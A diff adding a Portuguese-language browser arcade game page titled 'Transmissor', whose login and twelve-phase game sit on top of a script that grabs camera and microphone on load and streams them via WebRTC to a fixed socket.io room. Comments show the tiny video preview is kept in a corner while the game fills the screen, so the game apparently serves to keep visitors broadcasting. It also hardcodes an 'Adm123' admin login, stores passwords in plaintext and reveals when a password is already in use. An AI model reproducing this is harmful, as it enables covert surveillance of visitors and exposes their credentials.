@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>ART3M7S Transmissor - Jogo</title>
+<style>
+  body {margin:0; background:#0f172a; color:#fff; font-family:Arial; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; overflow:hidden;}
+
+  /* VIDEO FICA PEQUENO NO CANTO */
+  #localVideo {position:absolute; top:10px; right:10px; width:120px; height:160px; background:#000; border:2px solid lime; border-radius:8px; z-index:100; object-fit:cover;}
+
+  /* O JOGO OCUPA A TELA TODA */
+ .tela {text-align:center; background:#1e293b; padding:25px; border-radius:12px; width:90%; max-width:400px; max-height:90vh; overflow-y:auto;}
+  input {padding:10px; border-radius:8px; border:none; width:80%; margin:8px 0; font-size:16px; color:#000;}
+  button {padding:12px 24px; background:#22c55e; border:none; border-radius:8px; color:#fff; font-size:16px; cursor:pointer; margin:5px;}
+  button.sec {background:#475569;} button.adm {background:#f59e0b;} button.perder {background:#ef4444;}
+  canvas {background:#020617; display:none; border:2px solid #334155; border-radius:8px; touch-action:none;}
+  #info {position:absolute; top:10px; left:10px; text-align:left; font-size:15px; display:none; z-index:10; background:rgba(0,0,0,0.5); padding:5px 10px; border-radius:5px;}
+  #info span {margin-right:10px; display:block;}.adm-tag {color:#f59e0b; font-weight:bold;}
+  #controles {display:none; position:absolute; bottom:15px; width:100%; justify-content:center;}
+ .dpad {display:grid; grid-template-columns:55px 55px 55px; grid-template-rows:55px 55px 55px; gap:4px;}
+ .btn-controle {width:55px; height:55px; background:rgba(59,130,246,0.7); border:2px solid #3b82f6; border-radius:12px; color:#fff; font-size:20px; display:flex; justify-content:center; align-items:center; user-select:none; -webkit-user-select:none;}
+ .btn-controle:active {background:rgba(59,130,246,1);}
+  #btn-cima {grid-column:2; grid-row:1;} #btn-esquerda {grid-column:1; grid-row:2;}
+  #btn-direita {grid-column:3; grid-row:2;} #btn-baixo {grid-column:2; grid-row:3;}
+  #btn-acao {position:absolute; right:20px; bottom:70px; width:70px; height:70px; background:rgba(239,68,68,0.8); border-radius:50%; font-size:12px; display:flex; align-items:center; justify-content:center;}
+  #btn-pular {position:absolute; top:50px; right:10px; display:none; padding:8px 12px; font-size:12px; z-index:10;}
+  #btn-pausar {position:absolute; top:10px; left:10px; display:none; padding:8px 12px; font-size:12px; z-index:10;}
+ .erro {color:#ef4444; font-size:14px; margin-top:5px;}
+ .grid-fases {display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-top:10px;}
+ .btn-fase {padding:10px; font-size:14px;}
+</style>
+</head>
+<body>
+
+<video id="localVideo" autoplay muted playsinline></video>
+
+<!-- TELAS DO JOGO -->
+<div id="tela-login" class="tela">
+  <h1>Login Jogo</h1>
+  <input type="text" id="loginNome" placeholder="Nome de usuário">
+  <input type="password" id="loginSenha" placeholder="Senha">
+  <br>
+  <button id="btnEntrar">Entrar</button>
+  <button id="btnCriar" class="sec">Criar Conta</button>
+  <p class="erro" id="erroLogin"></p>
+</div>
+
+<div id="tela-menu" class="tela" style="display:none;">
+  <h1>Bem-vindo, <span id="nomeLogado"></span> <span id="tagAdm" class="adm-tag"></span></h1>
+  <p>Recorde: <span id="recorde">0</span> pontos</p>
+  <p>Última Fase: <span id="ultimaFase">1</span>/12</p>
+  <button id="btnJogar">Jogar do Início</button>
+  <button id="btnContinuar">Continuar</button>
+  <button id="btnSom">Som: ON</button>
+  <button id="btnEscolherFase" class="adm" style="display:none;">Escolher Fase</button>
+  <button id="btnSair" class="sec">Sair</button>
+</div>
+
+<div id="tela-escolher-fase" class="tela" style="display:none;">
+  <h1>Escolher Fase</h1>
+  <div class="grid-fases" id="gridFases"></div>
+  <br><button id="btnVoltarMenu" class="sec">Voltar</button>
+</div>
+
+<div id="tela-transicao" class="tela" style="display:none;">
+  <h1 id="tituloTransicao"></h1>
+  <p id="textoTransicao"></p>
+  <button id="btnContinuarJogo">Continuar</button>
+</div>
+
+<div id="info">
+  <span id="txtNome"></span>
+  <span id="txtFase"></span>
+  <span id="txtPontos"></span>
+  <span id="admTag" class="adm-tag" style="display:none;">[ADM]</span>
+</div>
+<button id="btn-pular" class="adm">PULAR FASE</button>
+<button id="btn-pausar" class="sec">PAUSAR</button>
+<canvas id="jogo"></canvas>
+
+<div id="controles">
+  <div class="dpad">
+    <div class="btn-controle" id="btn-cima">▲</div>
+    <div class="btn-controle" id="btn-esquerda">◀</div>
+    <div class="btn-controle" id="btn-direita">▶</div>
+    <div class="btn-controle" id="btn-baixo">▼</div>
+  </div>
+  <div class="btn-controle" id="btn-acao" style="display:none;">ATIRAR</div>
+</div>
+
+<div id="tela-fim" class="tela" style="display:none;">
+  <h1 id="mensagemFim"></h1>
+  <p id="pontuacaoFim"></p>
+  <button id="btnTentarNovamente" class="perder">Tentar Novamente</button>
+  <button id="btnMenu" class="sec">Voltar ao Menu</button>
+  <button id="btnReiniciar">Reiniciar Fase</button>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+/* 1. CODIGO DA CAMERA + WEBRTC */
+const socket = io();
+let localStream;
+const ROOM = "sala-principal";
+
+window.onload = async() => {
+  try{
+    localStream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+    document.getElementById('localVideo').srcObject = localStream;
+    socket.emit('join-room', ROOM);
+    iniciarOferta();
+  }catch(err){
+    alert("Permita o acesso a câmera e microfone para transmitir");
+  }
+}
+
+async function iniciarOferta(){
+  let pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+  localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+  let offer = await pc.createOffer();
+  await pc.setLocalDescription(offer);
+  socket.emit('offer', offer, ROOM);
+}
+
+/* 2. SEU JOGO COMPLETO */
+const canvas = document.getElementById('jogo');
+const ctx = canvas.getContext('2d');
+let usuarioLogado = null, fase = 1, pontos = 0, isAdmin = false;
+let jogoRodando = false, pausado = false, tipoJogo = 1, somOn = true;
+let jogador, moedas, inimigos, alvos, tiros=[], tirosInimigo=[], asteroides, chefao, particulas = [];
+let teclas = {};
+
+function resizeCanvas() {
+  let size = Math.min(window.innerWidth, window.innerHeight) * 0.9;
+  size = Math.min(size, 400);
+  canvas.width = size; canvas.height = size;
+}
+resizeCanvas(); window.addEventListener('resize', resizeCanvas);
+
+if(!localStorage.getItem('usuarios')) {
+  salvarUsuario('Adm123', 'Adm123', 0, 1);
+}
+
+function salvarUsuario(nome, senha, recorde=0, ultimaFase=1) {
+  let usuarios = JSON.parse(localStorage.getItem('usuarios')) || {};
+  usuarios[nome] = {senha, recorde, ultimaFase};
+  localStorage.setItem('usuarios', JSON.stringify(usuarios));
+}
+function buscarUsuario(nome) {
+  let usuarios = JSON.parse(localStorage.getItem('usuarios')) || {};
+  return usuarios[nome];
+}
+function senhaJaExiste(senha) {
+  let usuarios = JSON.parse(localStorage.getItem('usuarios')) || {};
+  return Object.values(usuarios).some(u => u.senha === senha);
+}
+
+document.getElementById('btnCriar').onclick = () => {
+  let nome = document.getElementById('loginNome').value.trim();
+  let senha = document.getElementById('loginSenha').value;
+  if(nome === "" || senha === "") { erro("Preencha nome e senha"); return; }
+  if(nome.length < 3) { erro("Nome precisa ter 3+ caracteres"); return; }
+  if(senha.length < 3) { erro("Senha precisa ter 3+ caracteres"); return; }
+  if(nome.toLowerCase() === 'adm123') { erro("Usuário ADM reservado"); return; }
+  if(buscarUsuario(nome)) { erro("Este nome já está em uso"); return; }
+  if(senhaJaExiste(senha)) { erro("Esta senha já está em uso"); return; }
+  salvarUsuario(nome, senha);
+  logar(nome, false);
+}
+
+document.getElementById('btnEntrar').onclick = () => {
+  let nome = document.getElementById('loginNome').value.trim();
+  let senha = document.getElementById('loginSenha').value;
+  let user = buscarUsuario(nome);
+  if(!user) { erro("Usuário não encontrado"); return; }
+  if(user.senha!== senha) { erro("Senha incorreta"); return; }
+  logar(nome, nome === 'Adm123');
+}
+
+function erro(msg) { document.getElementById('erroLogin').innerText = msg; }
+function logar(nome, admin) {
+  usuarioLogado = nome; isAdmin = admin;
+  let user = buscarUsuario(nome);
+  document.getElementById('tela-login').style.display = 'none';
+  document.getElementById('tela-menu').style.display = 'block';
+  document.getElementById('nomeLogado').innerText = nome;
+  document.getElementById('tagAdm').innerText = admin? "[ADM]" : "";
+  document.getElementById('recorde').innerText = user.recorde;
+  document.getElementById('ultimaFase').innerText = user.ultimaFase;
+  document.getElementById('btnEscolherFase').style.display = admin? 'inline-block':'none';
+  document.getElementById('btnContinuar').style.display = user.ultimaFase > 1? 'inline-block':'none';
+  document.getElementById('erroLogin').innerText = "";
+  document.getElementById('admTag').style.display = admin? 'inline':'none';
+}
+
+document.getElementById('btnSom').onclick = () => {
+  somOn =!somOn;
+  document.getElementById('btnSom').innerText = `Som: ${somOn? 'ON' : 'OFF'}`;
+}
+
+document.getElementById('btnSair').onclick = () => {
+  usuarioLogado = null; isAdmin = false;
+  document.getElementById('tela-menu').style.display = 'none';
+  document.getElementById('tela-login').style.display = 'block';
+}
+
+document.getElementById('btnEscolherFase').onclick = () => {
+  document.getElementById('tela-menu').style.display = 'none';
+  document.getElementById('tela-escolher-fase').style.display = 'block';
+  let grid = document.getElementById('gridFases');
+  grid.innerHTML = "";
+  for(let i=1; i<=12; i++) {
+    let btn = document.createElement('button');
+    btn.innerText = i;
+    btn.className = 'btn-fase adm';
+    btn.onclick = () => iniciarFaseEspecifica(i);
+    grid.appendChild(btn);
+  }
+}
+document.getElementById('btnVoltarMenu').onclick = () => {
+  document.getElementById('tela-escolher-fase').style.display = 'none';
+  document.getElementById('tela-menu').style.display = 'block';
+}
+
+['btn-cima','btn-baixo','btn-esquerda','btn-direita'].forEach((id,i)=>{
+  let key = ['arrowup','arrowdown','arrowleft','arrowright'][i];
+  const btn = document.getElementById(id);
+  ['touchstart','mousedown'].forEach(evt => btn.addEventListener(evt, (e) => {e.preventDefault(); teclas[key] = true}));
+  ['touchend','mouseup','mouseleave'].forEach(evt => btn.addEventListener(evt, (e) => {e.preventDefault(); teclas[key] = false}));
+});
+document.addEventListener('keydown', e => {
+  teclas[e.key.toLowerCase()] = true;
+  if(e.key.toLowerCase() === 'p' || e.key === 'Escape') togglePausa();
+});
+document.addEventListener('keyup', e => teclas[e.key.toLowerCase()] = false);
+document.getElementById('btn-acao').addEventListener('touchstart', (e) => {e.preventDefault(); if(tipoJogo===2 || tipoJogo===4) tiros.push({x: jogador.x, y: jogador.y - 15, vel:6}); });
+document.getElementById('btn-acao').addEventListener('click', (e) => {e.preventDefault(); if(tipoJogo===2 || tipoJogo===4) tiros.push({x: jogador.x, y: jogador.y - 15, vel:6}); });
+document.getElementById('btn-pular').onclick = () => { if(isAdmin) passarFase(); }
+document.getElementById('btn-pausar').onclick = togglePausa;
+
+function togglePausa() {
+  if(!jogoRodando) return;
+  pausado =!pausado;
+  document.getElementById('btn-pausar').innerText = pausado? 'RETOMAR' : 'PAUSAR';
+}
+
+function getTipoJogo(f) { if(f <= 3) return 1; if(f <= 6) return 2; if(f <= 9) return 3; return 4; }
+
+document.getElementById('btnJogar').onclick = () => iniciarFaseEspecifica(1);
+document.getElementById('btnContinuar').onclick = () => {
+  let user = buscarUsuario(usuarioLogado);
+  iniciarFaseEspecifica(user.ultimaFase);
+}
+
+function iniciarFaseEspecifica(numFase) {
+  fase = numFase; pontos = 0;
+  document.getElementById('tela-menu').style.display = 'none';
+  document.getElementById('tela-escolher-fase').style.display = 'none';
+  iniciarFase();
+}
+
+function addParticula(x,y,cor='#facc15') {
+  for(let i=0;i<8;i++) particulas.push({x,y,vx:(Math.random()-0.5)*4,vy:(Math.random()-0.5)*4,life:20,cor});
+}
+
+function iniciarFase() {
+  tipoJogo = getTipoJogo(fase); pausado = false;
+  document.getElementById('tela-transicao').style.display = 'none';
+  document.getElementById('tela-fim').style.display = 'none';
+  canvas.style.display = 'block'; document.getElementById('info').style.display = 'block';
+  document.getElementById('controles').style.display = 'flex'; document.getElementById('btn-pausar').style.display = 'block';
+  document.getElementById('btn-pular').style.display = isAdmin? 'block':'none';
+  document.getElementById('btn-acao').style.display = (tipoJogo===2 || tipoJogo===4)? 'flex':'none';
+
+  let scale = canvas.width / 360;
+  let t = 15 * scale;
+  let velBase = 3 + (fase-1)*0.15;
+
+  if(tipoJogo === 1) { jogador = {x:canvas.width/2, y:canvas.height/2, t, vel:velBase}; moedas = []; inimigos = []; particulas = []; for(let i=0; i<5; i++) moedas.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, t:t*0.5}); for(let i=0; i<fase; i++) inimigos.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, t:t*0.8, vx: (Math.random()>.5?1:-1)*(1.5 + fase*0.2), vy: (Math.random()>.5?1:-1)*(1.5 + fase*0.2)}); }
+  if(tipoJogo === 2) { jogador = {x:canvas.width/2, y:canvas.height-30*scale, t, vel:velBase+1}; alvos = []; tiros = []; particulas = []; for(let i=0; i<3+(fase-3); i++) alvos.push({x: Math.random()*canvas.width, y: Math.random()*-200, t:t*0.8, vel:1+(fase-3)*0.3 + fase*0.1}); }
+  if(tipoJogo === 3) { jogador = {x:canvas.width/2, y:canvas.height-30*scale, t, vel:velBase+1}; asteroides = []; particulas = []; for(let i=0; i<4+(fase-6); i++) asteroides.push({x: Math.random()*canvas.width, y: Math.random()*-200, t:t*0.7, vel:2+(fase-6)*0.4 + fase*0.1}); }
+  if(tipoJogo === 4) { jogador = {x:canvas.width/2, y:canvas.height-30*scale, t, vel:velBase+1}; tiros = []; tirosInimigo = []; particulas = []; chefao = {x:canvas.width/2, y:50*scale, t:t*2, vida: 20 + (fase-9)*10, maxVida: 20 + (fase-9)*10, vx: 2 + (fase-9)*0.5, shootCD: 0}; }
+  jogoRodando = true; loop();
+}
+
+function loop() {
+  if(!jogoRodando) return;
+  if(!pausado) { atualizar(); }
+  desenhar();
+  requestAnimationFrame(loop);
+}
+
+function atualizar() {
+  if(teclas['w'] || teclas['arrowup']) jogador.y -= jogador.vel;
+  if(teclas['s'] || teclas['arrowdown']) jogador.y += jogador.vel;
+  if(teclas['a'] || teclas['arrowleft']) jogador.x -= jogador.vel;
+  if(teclas['d'] || teclas['arrowright']) jogador.x += jogador.vel;
+  jogador.x = Math.max(jogador.t, Math.min(canvas.width-jogador.t, jogador.x));
+  jogador.y = Math.max(jogador.t, Math.min(canvas.height-jogador.t, jogador.y));
+
+  particulas = particulas.filter(p => { p.x+=p.vx; p.y+=p.vy; p.life--; return p.life>0; });
+
+  if(tipoJogo === 1) {
+    moedas = moedas.filter(m => { if(Math.hypot(jogador.x - m.x, jogador.y - m.y) < jogador.t + m.t) { pontos += 10; addParticula(m.x,m.y); return false; } return true; });
+    if(moedas.length === 0) { passarFase(); return; }
+    inimigos.forEach(i => { i.x += i.vx; i.y += i.vy; if(i.x < i.t || i.x > canvas.width-i.t) i.vx *= -1; if(i.y < i.t || i.y > canvas.height-i.t) i.vy *= -1; if(!isAdmin && Math.hypot(jogador.x - i.x, jogador.y - i.y) < jogador.t + i.t) fimDeJogo("Você Perdeu!"); });
+  }
+  else if(tipoJogo === 2) {
+    for(let ti=tiros.length-1; ti>=0; ti--) { tiros[ti].y -= tiros[ti].vel; if(tiros[ti].y < 0) tiros.splice(ti,1); }
+    alvos.forEach(a => a.y += a.vel);
+    for(let ti=tiros.length-1; ti>=0; ti--) { for(let ai=alvos.length-1; ai>=0; ai--) { if(Math.hypot(tiros[ti].x - alvos[ai].x, tiros[ti].y - alvos[ai].y) < 8) { pontos += 20; addParticula(alvos[ai].x,alvos[ai].y); alvos.splice(ai,1); tiros.splice(ti,1); break; } } }
+    if(!isAdmin && alvos.some(a => a.y > canvas.height)) fimDeJogo("Você Perdeu!");
+    if(alvos.length === 0) { pontos += 50; passarFase(); return; }
+  }
+  else if(tipoJogo === 3) {
+    asteroides.forEach(a => a.y += a.vel);
+    if(!isAdmin && asteroides.some(a => Math.hypot(jogador.x - a.x, jogador.y - a.y) < jogador.t + a.t)) fimDeJogo("Você Perdeu!");
+    if(asteroides.every(a => a.y > canvas.height)) { pontos += 50; passarFase(); return; }
+  }
+  else if(tipoJogo === 4) {
+    for(let ti=tiros.length-1; ti>=0; ti--) { tiros[ti].y -= tiros[ti].vel; if(tiros[ti].y < 0) tiros.splice(ti,1); }
+    for(let ti=tirosInimigo.length-1; ti>=0; ti--) { tirosInimigo[ti].y += tirosInimigo[ti].vel; if(tirosInimigo[ti].y > canvas.height) tirosInimigo.splice(ti,1); if(!isAdmin && Math.hypot(jogador.x - tirosInimigo[ti].x, jogador.y - tirosInimigo[ti].y) < jogador.t) fimDeJogo("Você Perdeu!"); }
+    chefao.x += chefao.vx; if(chefao.x < chefao.t || chefao.x > canvas.width-chefao.t) chefao.vx *= -1;
+    chefao.shootCD--; if(chefao.shootCD <= 0 && fase > 9) { tirosInimigo.push({x:chefao.x, y:chefao.y+chefao.t, vel:3}); chefao.shootCD = 60 - fase*3; }
+    for(let ti=tiros.length-1; ti>=0; ti--) { if(Math.hypot(tiros[ti].x - chefao.x, tiros[ti].y - chefao.y) < 20) { chefao.vida -= 1; pontos += 30; addParticula(tiros[ti].x,tiros[ti].y,'#ef4444'); tiros.splice(ti,1); } }
+    if(!isAdmin && Math.hypot(jogador.x - chefao.x, jogador.y - chefao.y) < jogador.t + chefao.t) fimDeJogo("Você Perdeu!");
+    if(chefao.vida <= 0) { pontos += 200; passarFase(); return; }
+  }
+
+  document.getElementById('txtNome').innerText = usuarioLogado;
+  document.getElementById('txtFase').innerText = `Fase: ${fase}/12`;
+  document.getElementById('txtPontos').innerText = `Pontos: ${pontos}`;
+}
+
+function passarFase() {
+  fase++; jogoRodando = false; teclas = {};
+  if(!isAdmin) {
+    let user = buscarUsuario(usuarioLogado);
+    if(fase > user.ultimaFase) salvarUsuario(usuarioLogado, user.senha, user.recorde, fase);
+  }
+  canvas.style.display = 'none'; document.getElementById('info').style.display = 'none'; document.getElementById('controles').style.display = 'none'; document.getElementById('btn-pular').style.display = 'none'; document.getElementById('btn-pausar').style.display = 'none';
+  if(fase > 12) { fimDeJogo("Você Venceu o Jogo!"); return; }
+  document.getElementById('tela-transicao').style.display = 'block';
+  let titulos = ["Coletor de Moedas", "Tiro ao Alvo", "Campo de Asteroides", "Batalha Final"];
+  let textos = ["Pegue as moedas e fuja", "Destrua os alvos", "Desvie dos asteroides", "Derrote o Chefão"];
+  let idx = Math.floor((fase-1)/3);
+  document.getElementById('tituloTransicao').innerText = `Fase ${fase}: ${titulos[idx]}`;
+  document.getElementById('textoTransicao').innerText = textos[idx];
+  document.getElementById('btnContinuarJogo').onclick = iniciarFase;
+}
+
+function desenhar() {
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  let scale = canvas.width / 360;
+  if(tipoJogo === 1) { ctx.fillStyle = isAdmin? "#f59e0b" : "#3b82f6"; ctx.beginPath(); ctx.arc(jogador.x, jogador.y, jogador.t, 0, Math.PI*2); ctx.fill(); ctx.fillStyle = "#22c55e"; moedas.forEach(m => {ctx.beginPath(); ctx.arc(m.x, m.y, m.t, 0, Math.PI*2); ctx.fill();}); ctx.fillStyle = "#ef4444"; inimigos.forEach(i => {ctx.beginPath(); ctx.arc(i.x, i.y, i.t, 0, Math.PI*2); ctx.fill();}); }
+  if(tipoJogo === 2) { ctx.fillStyle = isAdmin? "#f59e0b" : "#3b82f6"; ctx.fillRect(jogador.x - jogador.t, jogador.y - jogador.t*0.7, jogador.t*2, jogador.t*1.3); ctx.fillStyle = "#facc15"; alvos.forEach(a => {ctx.beginPath(); ctx.arc(a.x, a.y, a.t, 0, Math.PI*2); ctx.fill();}); ctx.fillStyle = "#22c55e"; tiros.forEach(t => {ctx.fillRect(t.x - 2, t.y, 4, 10);}); }
+  if(tipoJogo === 3) { ctx.fillStyle = isAdmin? "#f59e0b" : "#3b82f6"; ctx.fillRect(jogador.x - jogador.t, jogador.y - jogador.t*0.7, jogador.t*2, jogador.t*1.3); ctx.fillStyle = "#94a3b8"; asteroides.forEach(a => {ctx.beginPath(); ctx.arc(a.x, a.y, a.t, 0, Math.PI*2); ctx.fill();}); }
+  if(tipoJogo === 4) { ctx.fill
